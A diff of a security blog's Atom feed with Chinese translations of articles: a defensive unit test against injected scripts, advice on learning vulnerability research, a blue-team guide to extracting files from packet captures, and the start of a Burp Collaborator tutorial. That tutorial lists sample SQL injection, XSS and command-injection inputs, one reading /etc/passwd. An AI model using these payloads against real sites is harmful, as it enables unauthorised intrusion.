+&lt;p&gt;有趣的事實是：寫這篇文章讓我花了幾個星期。我正在進行最後的草稿，然後我再次安裝了Firebase工具來檢查是否真是640這數字。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/800/1*6UCNd965XgbqxDhFcMgUUg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我想知道這七個新軟體包是做什麼的？我想知道管理Firebase工具的人是否知道這七個新軟體包的作用？我想知道有沒有人知道他們的軟體包需要做什麼？&lt;/p&gt;
+
+&lt;h4 id=&quot;3-webpack&quot;&gt;&lt;strong&gt;3. Webpack&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;您可能已經註意到，我沒有建議您將“安全的”HTML文件合併到build pipeline中（例如，共享CSS），儘管這樣可以解決程式碼重複問題。&lt;/p&gt;
+
+&lt;p&gt;這是因為即使是最簡單的Webpack pipeline中涉及的數百個包裹中任何一個都可能會修改building過程的輸出。Webpack自己需要367個包裹。像css-loader這樣的良性可能會增加246個。您可能會使用優秀的html-webpack-plugin來在您的索引文件中放置正確的CSS文件名，這將會在其上添加156個包。&lt;/p&gt;
+
+&lt;p&gt;再一次，我認為其中的任何一個都不太可能將腳本注入到縮小的輸出中。但是，要做出這麼大的努力來製作一個原始的，小的，手寫的，人類可讀的與倉鼠友好的HTML文件，然後在睡覺之前將其與幾百隻杜賓一起上線似乎是錯誤的。&lt;/p&gt;
+
+&lt;h4 id=&quot;4無能者的攻擊&quot;&gt;&lt;strong&gt;4.無能者的攻擊&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;最後一件防範措施所處理的是一些最危險如可以修改你編寫的任何代碼並取消你所提出的任何安全障礙的東西：從現在起開始6個月的新生孩子，你並不知道他們在做什麼。&lt;/p&gt;
+
+&lt;p&gt;這實際上是防止的最棘手的事情。我能想到的唯一的解決方案是“單元測試”，確保這些“安全”文件中沒有外部腳本。&lt;/p&gt;
+
+&lt;p&gt;`const fs = require(‘fs’);
+const path = require(‘path’);
+const { JSDOM } = require(‘jsdom’);&lt;/p&gt;
+
+&lt;p&gt;it(‘should not contain any external scripts, ask David why’, () =&amp;gt; {
+  const creditCardForm = fs.readFileSync(path.resolve(__dirname, ‘../public/credit-card-form.html’), ‘utf8’);&lt;/p&gt;
+
+&lt;p&gt;const dom = new JSDOM(
+    creditCardForm,
+    { runScripts: ‘dangerously’ },
+  );&lt;/p&gt;
+
+&lt;p&gt;const scriptElementWithSource = dom.window.document.querySelector(‘script[src]’);
+  expect(scriptElementWithSource).toBe(null);
+});`&lt;/p&gt;
+
+&lt;p&gt;我允許&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt;標籤沒有源碼（所以要inline code
+），但阻擋具有&lt;code class=&quot;highlighter-rouge&quot;&gt;src&lt;/code&gt;屬性的腳本標籤。我設置&lt;code class=&quot;highlighter-rouge&quot;&gt;jsdom&lt;/code&gt;執行腳本，所以我可以捕捉到如果有人正在使用&lt;code class=&quot;highlighter-rouge&quot;&gt;document.createElement()&lt;/code&gt;創建一個新的腳本元素。&lt;/p&gt;
+
+&lt;p&gt;至少在這種情況下，新的孩子實際上確實需要修改一個單元測試來添加一個腳本時，如果有那麼點運氣就可以啟動程式碼審查人員，這就足以檢視這個修改。&lt;/p&gt;
+
+&lt;p&gt;在已發布的安全HTML文件上運行這種性質的檢查也是一個好主意。然後，您可以更加輕鬆地使用Firebase工具和Webpack之類的東西，並且知道這1200個軟體包中的任何一個編輯您輸出的情況極其罕見。&lt;/p&gt;
+
+&lt;h3 id=&quot;包起來&quot;&gt;&lt;strong&gt;包起來&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;在我走之前，我想談談在過去幾周里我聽到很多的感受 - 我建議開發者應該使用更少的npm。&lt;/p&gt;
+
+&lt;p&gt;我理解這背後的情感驅動：包裹有可能是壞包裹的，所以越少的包裹必定越少問題。&lt;/p&gt;
+
+&lt;p&gt;但這不是一個好的建議。如果你的用戶數據的安全性依賴於你使用&lt;strong&gt;更少的&lt;/strong&gt;npm包，你的東西就談不上安全。&lt;/p&gt;
+
+&lt;p&gt;這就像讓一部分的杜賓遠離開你的倉鼠而已。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;如果我明天要開始一個新項目，創建一個處理高度敏感信息的網站，我會像我一個月前那樣，使用我的React，Webpack，Babel其他快樂夥伴。&lt;/p&gt;
+
+&lt;p&gt;我不在乎是否有一千個軟體包裹或者他們會不斷地改變成更多或者我永遠不知道其中一個是否包含惡意程式碼。&lt;/p&gt;
+
+&lt;p&gt;沒有一件事對我來會造成問題，因為我壓根不會把他們中的任何一個單獨留在教室裡與我的倉鼠獨處。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;嘿，謝謝你的閱讀！一如既往，安全是一項團隊運動; 如果我說了一些愚蠢的話或給出不好的建議，請讓我知道，我會努力解決它的。如果你有一個好主意也請讓我知道，我會添加它進文章並假裝它是我的。&lt;/p&gt;
+
+&lt;p&gt;祝你有個美好的一天！&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="Third-party code" /><summary type="html">我最近有寫了一篇文章，描述了我如何散布惡意代碼，以非常難以檢測的方式從數千個網站收集信用卡號和密碼。</summary></entry><entry><title type="html">吶，少年，你想學習資安嗎？</title><link href="https://security-onigiri.github.io//2018/03/07/1.html" rel="alternate" type="text/html" title="吶，少年，你想學習資安嗎？" /><published>2018-03-07T00:00:00-08:00</published><updated>2018-03-07T00:00:00-08:00</updated><id>https://security-onigiri.github.io//2018/03/07/1</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/07/1.html">&lt;p&gt;Tuesday，February 6，2018&lt;/p&gt;
+
+&lt;p&gt;Posted by &lt;a href=&quot;https://www.blogger.com/profile/03011648433786848352&quot; title=&quot;author profile&quot;&gt;Ivan Fratric &lt;/a&gt; at 4:21 AM&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.kinja-img.com/gawker-media/image/upload/s--De0bVR9---/c_scale,f_auto,fl_progressive,q_80,w_800/199nqjj20hmnigif.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;已經有很多人（包括我Google的同事，&lt;a href=&quot;https://medium.freecodecamp.org/so-you-want-to-work-in-security-bc6c10157d23&quot;&gt;Parisa&lt;/a&gt; 和 &lt;a href=&quot;https://lcamtuf.blogspot.ch/2016/08/so-you-want-to-work-in-security-but-are.html&quot;&gt;Michal&lt;/a&gt; 都曾經就這個話題寫過自己的想法，我建議你仔細閱讀。我知道我寫的這些可能已經有人說過了，但是每隔一段時間我總是會再次遇到這個問題，於是我決定寫下我自己的經驗。&lt;/p&gt;
+
+&lt;p&gt;首先談到的是，我是一個應用程式的安全研究員，我是從 漏洞研究/安全審查/ 尋找bug/ 駭客攻擊 等角度來寫這篇文章的。因為在安全領域還有很多其他的方向，比如安全研發，惡意軟體分析等等，而我對這些並不熟悉。&lt;/p&gt;
+
+&lt;p&gt;那麼，我是誰？為什麼你要在這個話題上信任我呢？嗯，首先我不是說你應該完全信任我，因為每個人的經驗和每個人的道路都是有所不同的。但如果您對我有那麼點感到好奇，我可以直接告訴您，我現在是&lt;a href=&quot;https://googleprojectzero.blogspot.ch/&quot;&gt;Google Project Zero&lt;/a&gt; 的成員，我曾經是谷歌安全團隊的成員，是&lt;a href=&quot;https://github.com/ivanfratric/winafl&quot;&gt;多個安全工具&lt;/a&gt;的作者，如果你在這個Blog上多花點時間翻閱，你會發現我已經從事安全工作十多年了。&lt;/p&gt;
+
+&lt;p&gt;我所認識的安全研究員皆來自許多不同的背景，但是我的背景卻不同，我有相當強的學術背景，這在我的同行中是非常罕見的，當然這並不是進入安全領域的門檻要求。然而，我所知道的安全研究員中的大多數人都有一些共同點，這裡我們來看第一條：&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;自己做點東西&lt;/strong&gt;
+對於我所知道的業內大多數人來說，在從事相關工作之前，安全只是一項業餘愛好。當然，如果你只是考慮如何學習安全，在告訴你如何開始之前，我得先告訴你自己做點東西並不會有什麼太大的幫助。繼續往下閱讀，我會在下面提到如何開始。而首先，還有一件事你應該注意(但不要讓它成為阻礙你的難關，我們將在後面看到如何解決它)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;現在開始學習安全，比十年前困難的多&lt;/strong&gt;
+我懷疑這件事不是每個人都會承認，但是安全在過去這些年，確實有了很大提高。是的，如果你足夠深入的話，你將會發現用十多年前的技術仍然沿用在可以運行的軟件或者硬件，例如 Web瀏覽器。當我正在研究我的第一個 Windows漏洞利用（stack overflow）時，我感到十分沮喪，因為微軟最近引入了新的 safe unlink機制，所以我讀到的一些眾所周知的stack overflow漏洞利用技術已經不再有效。但 10年後，剛開始學習安全的人們不僅需要處理 safe unlink 和 stack cookie ，還需要知道 SafeSEH / SEHOP、DEP、ASLR、CFG、ACG 還有瀏覽器的sandbox 等等。並不只限於 Web瀏覽器，如果你對比一下十年前和現在的 Web應用框架，你會發現在安全技術上已經了顯著的不同。&lt;/p&gt;
+
+&lt;p&gt;請不要害怕上面這一段文字，那麼你應該如何應付日益陡峭的學習曲線呢?&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;利用好學習資源&lt;/strong&gt;
+一般而言，剛開始入門的難度的確比較高，但實際上，現在的學習資源也比以前還要豐富。&lt;/p&gt;
+
+&lt;p&gt;但是另一個警告是: &lt;strong&gt;你需要能夠走出舒適圈並且自主學習&lt;/strong&gt;，沒有人會牽著你的手，或者成為你的導師(可能其他行業總是有厲害的師父善於傳承，站出來來幫助學徒成長，但是駭客很少這樣做)。 如果你喜歡按照預先設定好的課程大綱來進行(就像我承認關於我的大部分教育所做的那樣)，那麼你可能就不會在安全這方面走得太遠。&lt;/p&gt;
+
+&lt;p&gt;在獲得正確的學習資源之前，您需要學會正確地提問。 Google搜索 “如何成為駭客” 和類似的問題，在現在仍然會得到與以前一樣的一堆胡說八道。 相反，請嘗試搜尋更加細緻的問題，例如:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;我感興趣的這個軟體/硬體是如何運作的？它基於什麼技術？有我可以閱讀的源碼嗎？有教程嗎? 有技術文件嗎？&lt;/li&gt;
+  &lt;li&gt;有人已經設法成功破解了我想要破解的這一軟體/硬體嗎？他們有發布了 WriteUp嗎？ Exp呢？ 會議介紹呢？ 我真的明白他們是怎麼做了什麼了嗎？&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;由此可見，你自己必須在技術上相當不錯，以了解由別人製作的真實軟體或硬體是如何工作的。 雖然編寫程式碼和閱讀程式碼的技能並不完全相同，但仍存在相當大的重疊，所以如果您不習慣寫程式碼，在進一步深入研究安全之前，您可能需要改進這一點。&lt;/p&gt;
+
+&lt;p&gt;不要忘記第二點。 雖然之前我對技術性的東西還算是比較好的，但是直到我開始閱讀其他人發布的漏洞研究和 Exp後，我才真正理解安全為何物。&lt;/p&gt;
+
+&lt;p&gt;還有另一個警告: &lt;strong&gt;當你遇到你不了解的東西時，不要放棄。&lt;/strong&gt; 特別是在剛開始閱讀各種資源時，你會遇到的許多問題。 跳過這些部分的確是簡單的方法，但也是絕對錯誤的方法。 相反，想想遇到的每一bit的訊息都是你不了解的，那把它們作為線索，想想你還需要學習什麼。&lt;/p&gt;
+
+&lt;p&gt;雖然我寫到沒有人會牽著你的手，但這並不意味著你不應該提問。 事實上，你應該更自私一點。 人們不會為你而放下自己所做的工作，但如果你卡住了，他們可能會抽點時間給你一個正確的方向。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;使用推特&lt;/strong&gt;
+擁護一個特定的社交網路看起來很奇怪，但一個重要事實是很多安全團隊都使用 Twitter 來分享新聞，而且更重要的是那些最近的研究、漏洞、 PoC、會議演講和其他類似的資源連結都在這。 我真的不知道這些的起源是怎麼發生的，也許是短消息的形式讓人們更方便地分享資源連結，而不用受到漫長而不必要的討論的困擾。 所以，在 Twitter 上找那些研究或發表了你感興趣東西的人，然後翻閱他們的推特吧。&lt;/p&gt;
+
+&lt;p&gt;除了Twitter 以外，你可以找到有趣資源的其他地方是&lt;a href=&quot;https://www.reddit.com/r/netsec/&quot;&gt;r/netsec&lt;/a&gt; 和&lt;a href=&quot;https://news.ycombinator.com/&quot;&gt;Hacker News&lt;/a&gt; (儘管它除了安全性外還有某些其他的東西)。 你還可以看看安全會議的演講和錄音(它們有很多，但並不都是好的。 請將重點集中於技術性較強的那些會議)。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;打 CTF 是一種很好的學習方式&lt;/strong&gt;
+這是另一個我給你們的奇怪建議，因為我自己幾乎從不玩CTF，但是還記得我前面寫的有關難度曲線的內容嗎? 打 CTF 可以讓你的學習經歷更加循序漸進，因為 CTF 的賽題有多種難度級別(你通常可以通過每個賽題的分數來分辨)，所以你可以從更簡單的開始，然後從那裡開始一點點學習。 舉個例子，在關閉某些漏洞防護機制之後練習漏洞利用。 然後知道這兒有一個bug或知道用甚麼方式來解決它，也能獲得些許成就感。&lt;/p&gt;
+
+&lt;p&gt;幾乎每個星期在某一個地方都有一個 CTF 舉行，其中大部分都是可以在線上解題的，你可以在&lt;a href=&quot;https://ctftime.org/&quot;&gt;這邊&lt;/a&gt;
+找到安排的比賽時間。 如果你不能解決賽題，不要忘了還有他人解題後的 WriteUp 可以賽後參考學習。&lt;/p&gt;
+
+&lt;p&gt;CTF 可以成為一種很有趣的經歷，但當你學會一些東西之後，別忘了活用這些經驗繼續研究真實世界中的目標，你可能會感到十分驚喜!&lt;/p&gt;
+
+&lt;p&gt;還有，當你遇到真實世界的問題時:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;不要害怕失敗，哪怕一次又一次。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;現在漏洞研究的工作常常是讓人十分沮喪的，大部分你嘗試的東西都不會成功，但你必須接受這一點。 而且不要因此而灰心喪志。 這不是因為你初學經驗不足而發生在你身上，對於每一個富有經驗的研究員來說也是如此。 我們往往只能看到別人的成功，卻不知道其背後的代價。 當你失敗的時候，在繼續前進之前一定要弄明白失敗的原因。&lt;/p&gt;
+
+&lt;p&gt;你比你想像的更加聰明(反之亦然: 其他人並不像你想的那樣聰明)。
+這可能是一個有爭議的觀點，因為有其他人提出了“你並不比開發者更聰明” 的建議。 雖然這是真實的，對於業內很多人來說，這是一個很好的建議。但對許多剛剛入門或正在考慮入門的人來說，這可能是錯誤的，因為事實是，在看到別的聰明人做什麼之後，如果自己沒有在這個領域做任何事情，就很容易懷疑自己的能力。 讓我舉個例子: 現在你可能聽起來很奇怪，但是當我開始把安全作為一種愛好時，我認為我從來沒有足夠的能力去發現 Windows 中的漏洞。我從來沒有嘗試過，但是我偶然發現了我的第一個 Windows 漏洞：我 fuzz 了一些防護超爛的圖像庫，過了一段時間，我有一些崩潰樣本。 而當我意外地點擊 Windows 中的其中一個崩潰樣本時，Windows 資源管理器崩潰了- 這就是CVE-2008-3013。&lt;/p&gt;
+
+&lt;p&gt;另外一個例子: 在對一個軟體進行審查的時候，你可能會有一個想法，然後想“不，這太愚蠢了，開發人員肯定會想到這個”。 事實是，他們經常沒有。 公平地說，那不是因為他們愚蠢，那很可能是因為他們當時想到了其他問題並全神貫注的再處理。所以，如果“我比他們聰明”的思維方式有助於突破你為自己設定的人為限制，就請堅信這點吧。&lt;/p&gt;
+
+&lt;p&gt;當你和別人，特別是開發者交談的時候，請記住，他們是程式碼方面的專家，但是你是安全方面的專家。&lt;/p&gt;
+
+&lt;p&gt;我如何證明自己的能力?
+可以從賺錢開始:很多公司都有 bug bounty program: &lt;a href=&quot;https://www.google.com/about/appsecurity/reward-program/&quot;&gt;Google&lt;/a&gt;，&lt;a href=&quot;https://www.facebook.com/whitehat&quot;&gt;Facebook&lt;/a&gt;，&lt;a href=&quot;https://technet.microsoft.com/en-us/security/dn425036&quot;&gt;Microsoft&lt;/a&gt;，以及&lt;a href=&quot;https://www.hackerone.com/&quot;&gt;更多&lt;/a&gt; 更多 &lt;a href=&quot;https://www.bugcrowd.com/&quot;&gt;其他&lt;/a&gt;的獎金專案。&lt;/p&gt;
+
+&lt;p&gt;即使你挖到的漏洞拿不到獎金，但能幫助到他人，仍然能夠幫助證明你的實力。&lt;/p&gt;
+
+&lt;p&gt;挖漏洞並不是唯一的途徑，開發安全工具，做防禦性的研究，同樣是很有價值的。&lt;/p&gt;
+
+&lt;p&gt;還有什麼是我需要知道的?
+安全研究員的人生可能並不像你想像的那麼光鮮亮麗，為了成為一個享負盛名的大神，你需要在電腦面前坐到天荒地老。 這是一份有挑戰性的工作，並且需要花費相當大的精力。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Misc" /><summary type="html">Tuesday，February 6，2018</summary></entry><entry><title type="html">Blue Team: 提取封包內容-基礎篇</title><link href="https://security-onigiri.github.io//2018/02/20/Blue-Team-%E6%8F%90%E5%8F%96%E5%B0%81%E5%8C%85%E5%85%A7%E5%AE%B9-%E5%9F%BA%E7%A4%8E%E7%AF%87.html" rel="alternate" type="text/html" title="Blue Team: 提取封包內容-基礎篇" /><published>2018-02-20T00:00:00-08:00</published><updated>2018-02-20T00:00:00-08:00</updated><id>https://security-onigiri.github.io//2018/02/20/Blue%20Team-%E6%8F%90%E5%8F%96%E5%B0%81%E5%8C%85%E5%85%A7%E5%AE%B9-%E5%9F%BA%E7%A4%8E%E7%AF%87</id><content type="html" xml:base="https://security-onigiri.github.io//2018/02/20/Blue-Team-%E6%8F%90%E5%8F%96%E5%B0%81%E5%8C%85%E5%85%A7%E5%AE%B9-%E5%9F%BA%E7%A4%8E%E7%AF%87.html">&lt;h1 id=&quot;blue-team-提取封包內容-基礎篇&quot;&gt;Blue Team: 提取封包內容-基礎篇&lt;/h1&gt;
+
+&lt;p&gt;這篇會提到如何從 PCAP 萃取資料，不論是普通的網路流量分析或是惡意程式的 Malware 分析都會需要從流量中提取資料。&lt;/p&gt;
+
+&lt;h2 id=&quot;wireshark&quot;&gt;Wireshark&lt;/h2&gt;
+&lt;p&gt;Wireshark 是你最好的選擇當你需要分析小型 PCAP 檔案，但當檔案大小超過 800MB 執行效能會下滑。&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;開啟 Wireshark，擷取流量並最小化&lt;/li&gt;
+  &lt;li&gt;用瀏覽器開始 http://www.eicar.org/85-0-Download.html&lt;/li&gt;
+  &lt;li&gt;下載 eicar 的樣本&lt;/li&gt;
+  &lt;li&gt;當下載完成後停止擷取流量&lt;/li&gt;
+  &lt;li&gt;用 http 當作過濾條件在 Wireshark的 display filter bar. 參考連結: &lt;a href=&quot;https://biot.com/capstats/bpf.html&quot;&gt;BPF Filter&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;輸出 HTTP 檔案 [File &amp;gt; Export Objects &amp;gt; HTTP].&lt;/li&gt;
+  &lt;li&gt;選取、輸出 eicar 的檔案&lt;/li&gt;
+  &lt;li&gt;存檔 Wireshark PCAP. [File &amp;gt; Save As &amp;gt; test_eicar.pcap]&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://imgur.com/gNHMVEL.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;bro-ids&quot;&gt;Bro IDS&lt;/h2&gt;
+
+&lt;p&gt;使用 Bro IDS
+稍微進階一點的工具，當你需要調查/分析比較大的 PCAP 檔案時十分方便而且容易自動化。並且 Bro 支援 PCAP 檔案以外還有即時網路流量分析。&lt;/p&gt;
+
+&lt;p&gt;1.) Install Bro IDS (defaults)[/usr/local/bro]&lt;/p&gt;
+
+&lt;p&gt;我個人建議使用 Docker 幫助你更快的完成環境設定 https://github.com/blacktop/docker-bro 
+但是提取方面的腳本並沒有在這個 Github 專案裡面，你會需要額外設置。&lt;/p&gt;
+
+&lt;p&gt;2.) 在 local.bro 檔案寫入啟用 ‘extract all’  [/usr/local/bro/share/bro/local.bro]&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@load frameworks/files/extract-all-files
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;3.) 打開local.bro，修改預設提取檔案的最大上限預設值是 25MB。&lt;/p&gt;
+
+&lt;p&gt;在我們的實驗中包含的檔案都較小，但還是建議修改預設的上限。如果你在生產、實際環境使用 Bro IDS，你應該要好好的保存、維護你的資料。&lt;/p&gt;
+
+&lt;p&gt;[/usr/local/bro/share/bro/local.bro]&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;redef FileExtract::default_limit = 1000000000;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;1000000000 = 1 GByte&lt;/p&gt;
+
+&lt;p&gt;4.) 確認你將你的 config 部署到 Local Bro上。
+&lt;code class=&quot;highlighter-rouge&quot;&gt;broctl deploy&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;5.) 用 Bro 分析我們在之前錄製的 PCAP 檔案，Bro 會在當前資料夾解開 PCAP 內容。&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bro -Cr test_eicar.pcap local.bro &quot;Site::local_nets += { 10.0.0.0/24 }&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/hoMsRVU.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;打開 [files.log] 去辨識出哪個是 eicar 的檔案，得到 unique ID 後把資料解出來。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/EE1BXVa.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bro extraction的預設值: https://www.bro.org/sphinx/scripts/base/files/extract/main.bro.html&lt;/p&gt;
+
+&lt;h2 id=&quot;用雲端幫你分析&quot;&gt;用雲端幫你分析&lt;/h2&gt;
+
+&lt;p&gt;最近的新流行的方式，但其實後端也是用 BRO 或是 TShark 分析再幫你加上漂亮的圖表。&lt;/p&gt;
+&lt;center&gt;&lt;img src=&quot;https://i.imgur.com/gAmDYtG.png&quot; alt=&quot;&quot; class=&quot;&quot; /&gt;&lt;/center&gt;
+
+&lt;p&gt;&lt;strong&gt;請謹慎思考&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;當你要用這些服務之前你的封包檔案會被服務提供者取得，也就是你的封包內容也就會在網路被留存了。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://www.networktotal.com&lt;/li&gt;
+  &lt;li&gt;https://www.packettotal.com - T&amp;amp;Cs&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;下圖是 PacketTotal 的提取的範例圖&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/fb4FvPH.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;network-miner&quot;&gt;Network Miner&lt;/h2&gt;
+&lt;p&gt;NETRESEC 開發的 Windows GUI 有不錯效能的 PCAP 分析工具&lt;/p&gt;
+
+&lt;p&gt;非常適合快速圖片分析當你有大量圖片在你的 PCAP 中。請注意的是，免費板只有 0.84Mbits/s 所以會需要一點時間當你要分析較大的 PCAP 的時候。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/y1TXHxj.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Network Miner 會自動的提取、輸出檔案並用 IP 作為資料夾名稱。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/phxhLd2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;不論是哪個工具，都有各自的優勢與劣勢。
+有些不易於自動化或是有些是用於臨時快速分析的，最好從這些裡面熟悉幾項。
+如果你是高手/重度使用者，個人建議是使用 Python/Scapy 應該會是最合適的。&lt;/p&gt;
+
+&lt;h2 id=&quot;延伸閱讀&quot;&gt;延伸閱讀&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.sans.org/reading-room/whitepapers/forensics/extracting-files-network-packet-captures-36562&quot;&gt;SANS Reading Room&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/hosom/bro-file-extraction&quot;&gt;Bro IDS Extraction Scripts&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/caesar0301/awesome-pcaptools&quot;&gt;Awesome-pcaptools list&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://tools.kali.org/forensics/foremost&quot;&gt;Foremost&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.xplico.org/ http://tools.kali.org/information-gathering/xplico&quot;&gt;Xplico&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/sleuthkit/scalpel&quot;&gt;Scalpel&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.secdev.org/projects/scapy/&quot;&gt;Scapy&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>JohnThunder</name></author><category term="forensics" /><category term="network analysis" /><summary type="html">Blue Team: 提取封包內容-基礎篇</summary></entry><entry><title type="html">使用Burp Suite的Collaborator查找.Onion隱藏服務的真實IP地址</title><link href="https://security-onigiri.github.io//2018/01/29/burp-suitecollaboratoronionip.html" rel="alternate" type="text/html" title="使用Burp Suite的Collaborator查找.Onion隱藏服務的真實IP地址" /><published>2018-01-29T00:00:00-08:00</published><updated>2018-01-29T00:00:00-08:00</updated><id>https://security-onigiri.github.io//2018/01/29/burp-suitecollaboratoronionip</id><content type="html" xml:base="https://security-onigiri.github.io//2018/01/29/burp-suitecollaboratoronionip.html">&lt;p&gt;發佈於2017年11月23日&lt;/p&gt;
+
+&lt;p&gt;在屬於感恩節的這一天，我要寫一些與生活息息相關並令人喜愛的東西：填充。我現在可不是在跟你聊今天下午茶的美味麵包還是啥的，我正在說的是將Payloads填充到網站上來尋找漏洞這件事。&lt;/p&gt;
+
+&lt;p&gt;我們總是喜歡把奇怪的東西餵進網站。例如我們邊期待能達成SQL injection邊把我們的髒東西： &lt;code class=&quot;highlighter-rouge&quot;&gt;' or 1-1;&lt;/code&gt; 餵給網站，我們塞了一些 &lt;code class=&quot;highlighter-rouge&quot;&gt;; cat / etc / passwd&lt;/code&gt; 希望取得Command injection，我們把 &lt;code class=&quot;highlighter-rouge&quot;&gt;alert(“BEEP!!!”)&lt;/code&gt; 當成萬能鑰匙插入每個鎖孔希望能XXS，我們甚至走火入魔填入我們的信用卡號碼，然後幻想它會有如&lt;a href=&quot;https://www.youtube.com/watch?v=rQ6LC-olw9Q&quot;&gt;1967年星際爭霸戰The Trouble with Tribbles&lt;/a&gt;情節中的病毒自動蠶食資源充值。&lt;/p&gt;
+
+&lt;p&gt;有時我們會立即收到來自我們Payload的即時反饋，並使我們可以在幾秒鐘內確認一個漏洞的存在。例如我們輸入 &lt;code class=&quot;highlighter-rouge&quot;&gt;' or 1-1;&lt;/code&gt; 並以此繞過登錄畫面，我就可以開啟我的SQL injection花式技巧工具箱對它予取予求。但問題來了，當你注入Payload的地方回應總是高延遲該如何是好？那麼如果我現在對一個網站注入的Payload並不馬上執行，需要等到某個管理員在星期一上午查看日誌才發動該怎麼辦？如果我們希望能夠檢測Payload是否正常工作，那麼我們就需要建立一個每天24小時持續性的監聽系統。&lt;/p&gt;
+
+&lt;p&gt;Burp Suite在2015年推出“Burp Collaborator”讓這件事變得更加容易。被免費打包同捆在Burp Suite Professional一起提供的“Burp Collaborator”是一個伺服器，它每年365天、每天24小時監聽您的Payload並進行後續反饋。(如果你沒有間歇性停電問題且有放好乖乖的話)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/HCAY8ot.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;截圖如上所示，我可以點擊“copy to clipboard”來生成一個我可以在任何Payload中使用的唯一的URL。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/lndZ8SJ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;如果任何人或任何東西查看這個URL或訪問它，我會在我的Burp Suite Collaborator客戶端獲得一個通知。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/LsrrUek.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;這是功能是如此令人驚艷且難以置信的強大。現在我們已經有系統來補完Payload，並且無論我們處理多長時間的延遲，都能聽取它們的反饋。正如早些時候官方的Burp Suite twitter feed所說的，如果你沒有進行&lt;a href=&quot;http://blog.portswigger.net/2017/07/oast-out-of-band-application-security.html&quot;&gt;帶外應用安全測試（OAST）&lt;/a&gt;，那麼你就做錯了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/5AShOCQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;好的，這個真的非常簡單，也讓我們的更加興奮期待下一步，&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/qhrynr9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
